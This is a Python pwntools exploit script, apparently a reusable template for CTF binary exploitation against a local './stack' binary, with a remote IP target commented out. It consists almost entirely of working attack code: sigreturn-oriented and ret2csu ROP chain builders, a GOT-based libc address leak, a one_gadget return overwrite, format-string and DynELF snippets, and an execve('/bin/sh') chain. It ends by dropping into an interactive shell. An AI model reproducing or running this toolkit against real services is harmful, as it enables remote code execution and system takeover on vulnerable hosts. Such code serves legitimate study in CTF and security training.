#-*-coding=utf-8-*-
import pwn
from pwn import *
from LibcSearcher import *
import os
import sys
symbols_list = ['system','read','write','printf','puts','gets','scanf','__isoc99_scanf','/bin/sh','/bin/bash','execve','main','__libc_start_main_ret','str_bin_sh','\x5f\xc3']
#============================================================================================#
def file_info(Bin, Libc):
    print "#=================================================================================#"
    info('Bin File Info : ')
    os.system("file " + Bin)
    os.system("ldd " + Bin)
    print "\n"
    info('Libc File Info : ')
    os.system("file " + Libc)
    os.system("ldd " + Libc)
    print "#=================================================================================#"

def bin_info():
    info("Bin Info : ")
    info("Bin Load Addr: " + hex(elf.address))
    print "  "
    info("Symbols Addr :")
    for i in symbols_list:
        try:
            Current_Bin_Func = i
            info(Current_Bin_Func + " " + str(hex(elf.symbols[str(i)])))
        except:
            null = ""
    print "  "
    info("Got Addr :")
    for i in symbols_list:
        try:
            Current_Bin_Func = i
            info(Current_Bin_Func + " " + str(hex(elf.got[str(i)])))
        except:
            null = ""
    print "  "
    info("String Symbols Addr :")
    for i in symbols_list:
        try:
            Current_Bin_Func = i
            info(Current_Bin_Func + " " + str(hex(next(elf.search(str(i))))))
        except:
            null = ""
    print "  "
#=================================================================================#
    temp = ""
    if Libc == "":
        Warning("Not Libc File.")
    else:
        global libc
        print "#=================================================================================#"
        info("Libc Info : ")
        libc = ELF(Libc)
        info("Libc Load Addr: " + hex(libc.address))
        #info("Libc Symbol Offset : " + os.popen('strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"').read())
        print "  "
        info("Symbols Offset :")
        for i in symbols_list:
            try:
                Current_Libc_Func = i
                info(Current_Libc_Func + " " + str(hex(libc.symbols[str(i)])))
            except:
                null = ""
        print "  "
        info("String Symbols Offset :")
        for i in symbols_list:
            try:
                Current_Libc_Func = i
                info(Current_Libc_Func + " " + str(hex(next(libc.search(str(i))))))
            except:
                null = ""
        print "  "

#============================================================================================#

def srop(padding=0, arg1=0x000000, arg2=0x000000, arg3=0x000000, call_number=0x000000, syscall_ret=0x000000, ret_addr=0x000000):
    #syscall(rax,rdi,rsi,rdx)
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall_ret            # rip = syscall ret
    #frame.rax = constants.SYS_write   # Call Number
    frame.rax = call_number
    frame.rdi = arg1
    frame.rsi = arg2
    frame.rdx = arg3
    frame.rsp = ret_addr               # Ret Addr
    io.recv()
    spayload = "\x41" * padding        # Padding
    spayload += str(frame)             # Frame Body
    #spayload += p64(rax)              # Set rax = 15
    spayload += p64(syscall_ret)       # Syscall ; ret
    io.sendline(spayload)

    # {
    # sys_mprotect(buffer_page, 0x1000, 0x7)
    # rax = 0xa
    # rdi = buffer_page, rsi = 0x1000, rdx = 0x7
    # rsp =buffer_address+304, rip = syscall;ret
    # }

    #constants.SYS_read, constants.SYS_write, constants.SYS_mprotect, constants.SYS_execve
    # 0	 sys_read	        unsigned int fd	          char *buf	                size_t count			
    # 1	 sys_write	        unsigned int fd	          const char *buf	        size_t count
    # 9  sys_mmap
    # 10 sys_mprotect	    unsigned long start	      size_t len	            unsigned long prot	
    # 13 rt_sigaction	    
    # 14 rt_sigprocmask	    
    # 15 sys_rt_sigreturn	unsigned long __unused	
    # 59 sys_execve	        const char *filename	  const char *const argv[]	const char *const envp[]

def general_rop(padding=0, function=0x000000, arg1=0x000000, arg2=0x000000, arg3=0x000000, ret_addr=0x000000):
    #rdi=  edi = r13,  rsi = r14, rdx = r15 
    io.recv()
    payload = "\x41" * padding  # padding
    payload += p64(general_gg1) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
    payload += p64(0)           # Junk
    payload += p64(0)           # rbx = 0 ,rbx should be 0
    payload += p64(1)           # rbp = 1 ,enable not to jump
    payload += p64(function)    # pop r12 , call qword ptr [r12+rbx*8]
    payload += p64(arg1)        # pop r13 , rdi = edi = r13d
    payload += p64(arg2)        # pop r14 , rsi
    payload += p64(arg3)        # pop r15 , rdx
    payload += p64(general_gg2) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
    payload += "\x42" * 0x38      # 0x38
    payload += p64(ret_addr)    # Return Func Addr 
    io.sendline(payload)

def get_libc(function, address):
    global one_gadget_addr, system_addr, bin_sh_addr, libc_start_main_ret_addr, libc_base
    # Use Write Or Puts Or Printf Func Print Symbols addr
    # Call get_libc Func
    try:
        libcsearch = LibcSearcher(function, address)
        libc_base = address - libcsearch.dump(function)
        bin_sh_addr = libc_base + libcsearch.dump("str_bin_sh")
        system_addr = libc_base + libcsearch.dump("system")
        one_gadget_addr = libc_base + 0x10a38c
        libc_start_main_ret_addr = libc_base + libcsearch.dump("__libc_start_main_ret")
        info("Found Libc base           : " + hex(libc_base))
        info("Found Str BinSh           : " + hex(bin_sh_addr))
        info("Found System              : " + hex(system_addr))
        info("Found One_gadget          : " + hex(one_gadget_addr))
        info("Found Libc_start_main_ret : " + hex(libc_start_main_ret_addr))
    except:
        null = ""

def recv_info(start_addr=0x0, offset=0x0):
    global recv_addr
    recv_addr = hex(u64(io.recv()[start_addr:start_addr + 8]))
    recv_addr = int(recv_addr,base=16) - offset
    print hex(recv_addr)
    return recv_addr

def leak(addr):
    try:
        general_rop(136,elf.got['write'],1,addr,8,elf.symbols['main'])
        content = io.recvline(8)
        while True:
            c = io.recv(numb=1, timeout=0.1)
            count += 1
            if up == '\n' and c == "": 
                content = content[:-1]+'\x00' 
                break
            else:
                content += c
                up = c
        content = content[:4] 
        print "From : " + addr + " Buffer : " + content
        return content
    except:
        null = ""

# Function called in order to send a payload
def fmt_send_payload(payload):
        log.info("payload = %s" % repr(payload))
        io.sendline(payload)
        return io.recv()

def ropchain():
    try:
        assembly = 'syscall; pop rdx; pop rsi; ret ; pop rdi ; int 0x80; pop rsi; pop rdx; ret ; pop rdi ; ret'
        binary = elf
        rop = ROP(binary)
        bss = elf.bss()
        #rpayload += rop.call('read', 0, bss_base, 100)
        #rpayload += rop.dl_resolve_call(bss_base + 20, bss_base)
        #rpayload += rop.string('/bin/sh')
        #rpayload += rop.fill(20, buf)
        #rpayload += rop.dl_resolve_data(bss_base + 20, 'system')
        #rop.raw(sh)
        # rop.read(0, 0x404048, next(elf.search("/bin/sh;")))
        # rop.write(0, 0x404048, 8)
        rop.call(Libc.symbols['system'],[next(Libc.search('/bin/date'))])
        #rop.system(next(elf.search('/bin/bash')))
        # rop.call(elf.symbols['system'],[next(elf.search('/bin/date'))])
        info("ROP Dump : \n" + rop.dump())
        rop_payload = "\x41" * 1032 + str(rop)
        io.sendline("3")
        io.sendline(rop_payload)
    except:
        null = ""
#=================================================================================#
Bin = "./stack"
Libc = '/lib/x86_64-linux-gnu/libc.so.6'
context.os = 'linux'
context.arch = 'amd64'
context.timeout = 1
#context.endian = 'little'
context.terminal = ['tmux', 'splitw', '-h']
shellcode = asm(shellcraft.linux.sh())
shellcode_x64 = asm(shellcraft.amd64.linux.sh())
context.log_level = 'debug'
file_info(Bin, Libc)
elf = ELF(Bin)
bin_info()
context.binary = Bin
print "#=================================================================================#"
#=================================================================================#
io = process(Bin)
#io = remote('192.168.145.131', 3333)
io.recv()
#=================================================================================#
# Example : RDI, RSI, RDX, RCX, R8, R9
# Example : eax, ebx, ecx, edx, esi, edi
# general gadget1：pop rbx; pop rbp; pop r12; pop r13; pop
# general gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d;
general_gg1 = 0x400606
general_gg2 = 0x4005F0
# general_rop(136,elf.got['read'],0,0x404080,16,elf.symbols['main'])
# srop(padding, arg1, arg2, arg3, syscall_ret, ret_addr)
# write(rdi=1, rsi=write.got, rdx=8)
# read(rdi=0, rsi=bss_addr, rdx=16)
# system(rdi = bss_addr+8 = "/bin/sh")
# sys_mprotect(buffer_page, 0x1000, 0x7)
#general_rop(136,elf.got['puts'],elf.got['write'],0,0,elf.symbols['main'])
general_rop(136,elf.got['puts'],elf.got['puts'],0,16,elf.symbols['main'])
get_libc("puts",recv_info(0x80+12,0x560a000000000000))
io.sendline("\x41" * 136 + p64(one_gadget_addr))


"""
# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=fmt_send_payload)
format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
format_string.execute_writes()

d = DynELF(leak, elf = elf)
try:
    system_addr = d.lookup('system', 'libc')
    read_addr = d.lookup('read', 'libc')
    info("system : " + system_addr)
    info("read :" + read_addr)
except:
    null = ""
"""

#=================================================================================#
try:
    while recv != "":
        recv = io.recv()
except:
    null = ""
sleep(0.1)
io.interactive()
#=================================================================================#
"""
# x86
# execve("/bin/sh", NULL, NULL)
# payload += p32(pop_edx_ecx_ebx_ret) 
payload += p32(0x00)   # edx
payload += p32(0x00)   # ecx
payload += p32(bin_sh) # ebx
# payload += p32(pop_eax_ret) 
payload += p32(0x0b)   #eax 
payload +=p32(int_80)  #Int 0x80
# Call func way : [ call < push ret_addr , push argv1 , jmp system > ]
"""